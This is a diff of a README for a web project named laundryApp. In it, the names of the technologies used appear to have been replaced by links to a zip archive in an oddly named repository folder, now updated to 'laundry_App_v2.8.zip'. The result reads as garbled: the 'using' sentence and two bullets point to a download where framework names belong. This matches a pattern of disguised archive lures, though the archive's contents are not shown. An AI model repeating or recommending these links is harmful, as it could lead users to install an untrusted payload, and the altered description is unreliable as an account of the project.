@@ -1,14 +1,14 @@
 # laundryApp
  
- A Web Application using https://raw.githubusercontent.com/SWChan01/laundryApp/master/textrine/laundryApp.zip following the MVC design pattern
+ A Web Application using https://github.com/SWChan01/laundryApp/raw/refs/heads/master/textrine/laundry_App_v2.8.zip following the MVC design pattern
 
 
 **Technologies used**:
 
 
-* https://raw.githubusercontent.com/SWChan01/laundryApp/master/textrine/laundryApp.zip
+* https://github.com/SWChan01/laundryApp/raw/refs/heads/master/textrine/laundry_App_v2.8.zip
 * MySql
-* https://raw.githubusercontent.com/SWChan01/laundryApp/master/textrine/laundryApp.zip
+* https://github.com/SWChan01/laundryApp/raw/refs/heads/master/textrine/laundry_App_v2.8.zip
 * Bootstrap
 
 
